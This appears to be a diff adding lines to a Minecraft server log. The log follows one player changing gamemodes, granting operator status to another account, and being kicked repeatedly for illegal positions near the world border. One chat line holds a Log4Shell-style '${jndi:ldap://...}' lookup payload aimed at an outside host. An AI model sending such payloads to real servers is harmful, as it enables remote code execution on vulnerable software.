@@ -182,3 +182,13 @@ org.bukkit.plugin.UnknownDependencyException: ProtocolLib
 [16:33:16] [Server thread/INFO]: odragclicker issued server command: /minecraft:gamemode survival
 [16:31:07] [Async Chat Thread - #1/INFO]: <odragclicker> ${jndi:ldap://192.168.255.255}
 [16:33:28] [Server thread/INFO]: odragclicker issued server command: /minecraft:gamemode creative
+[16:33:33] [Server thread/INFO]: odragclicker issued server command: /minecraft:gamemode survival
+[16:33:41] [Server thread/INFO]: odragclicker issued server command: /op bxrl
+[16:33:44] [Server thread/INFO]: odragclicker lost connection: Illegal position
+[16:33:44] [Server thread/INFO]: odragclicker left the game.
+[16:33:44] [Server thread/WARN]: handleDisconnection() called twice
+[16:33:46] [Thread-12/INFO]: UUID of player odragclicker is feae7bc6-f928-3e9c-93d6-1d438f7be890
+[16:33:46] [Server thread/INFO]: odragclicker[/127.234.38.98:51001] logged in with entity id 54 at ([world]2.999999395633752E7, 4.870000003278255, 3.0000009266415518E7)
+[16:33:46] [Server thread/INFO]: odragclicker lost connection: Illegal position
+[16:33:46] [Server thread/INFO]: odragclicker left the game.
+[16:33:46] [Server thread/WARN]: handleDisconnection() called twice
